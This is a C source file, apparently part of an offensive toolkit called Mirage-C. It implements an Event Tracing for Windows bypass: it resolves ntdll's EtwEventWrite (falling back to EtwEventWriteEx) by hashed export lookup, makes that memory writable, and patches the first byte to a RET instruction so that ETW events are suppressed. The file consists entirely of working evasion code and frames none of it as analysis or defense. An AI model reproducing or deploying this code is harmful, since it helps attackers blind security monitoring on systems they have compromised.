/*
 * etw_bypass.c — ETW bypass for Mirage-C
 *
 * Direct translation of Zig src/evasion/etw_bypass.zig.
 * Patches ntdll!EtwEventWrite (or EtwEventWriteEx as fallback)
 * with a single RET instruction (0xC3) to suppress ETW events.
 */

#include "etw_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_ETW_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include <string.h>

/* ── Helper: resolve function from module by hash ─────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Helper: patch first byte of function ─────────────────── */

static int patch_first_byte(void* func_ptr) {
    PVOID base = func_ptr;
    SIZE_T size = 1;
    ULONG old_prot = 0;

    NTSTATUS status = mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(~0ULL),
        &base, &size,
        PAGE_EXECUTE_READWRITE,
        &old_prot
    );
    if (status < 0) return 0;

    volatile uint8_t* patch = (volatile uint8_t*)func_ptr;
    patch[0] = 0xC3;

    mirage_NtFlushInstructionCache(
        (HANDLE)(intptr_t)(~0ULL),
        func_ptr, 1
    );

    PVOID restore_base = func_ptr;
    SIZE_T restore_size = 1;
    mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(~0ULL),
        &restore_base, &restore_size,
        old_prot, &old_prot
    );

    return 1;
}

/* ── mirage_patch_etw ─────────────────────────────────────── */

int mirage_patch_etw(void) {
    void* ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module("ntdll.dll")
    );
    if (!ntdll) return 0;

    void* etw_write = resolve_func(ntdll, "EtwEventWrite");
    if (etw_write)
        return patch_first_byte(etw_write);

    /* Fallback to EtwEventWriteEx */
    void* etw_write_ex = resolve_func(ntdll, "EtwEventWriteEx");
    if (etw_write_ex)
        return patch_first_byte(etw_write_ex);

    return 0;
}

#endif /* ENABLE_ETW_BYPASS */
